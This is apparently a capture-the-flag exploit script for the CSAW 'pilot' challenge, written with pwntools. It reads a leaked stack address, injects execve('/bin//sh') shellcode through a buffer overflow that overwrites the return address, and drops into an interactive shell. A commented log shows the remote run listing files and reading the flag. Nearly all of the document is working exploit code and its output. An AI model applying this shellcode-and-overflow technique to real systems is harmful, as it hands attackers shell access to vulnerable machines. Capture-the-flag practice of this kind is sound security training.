#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', terminal=['tmux', 'neww'])

if args['GDB']:
    io = gdb.debug('./pilot', gdbscript='''\
        b *0x400b35
        c
    ''')
elif args['REMOTE']:
    io = remote('pwn.chal.csaw.io', 8464)
else:
    io = process('./pilot')

s = io.recvregex(r'\[\*\]Location:(.+)\n')
ret_addr = int(s[s.rindex(':')+1:], 16)

sh = asm('''
    xor rax, rax
    push rax
    movabs rax, 0x68732f6e69622f2f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
''')
io.send(fit({0: sh, cyclic_find('kaaa'): ret_addr}, length=64))

io.interactive()

# $ ./pilot.py REMOTE
# [+] Opening connection to pwn.chal.csaw.io on port 8464: Done
# [*] Switching to interactive mode
# [*]Command:$ ls
# flag
# pilot
# $ cat flag
# flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
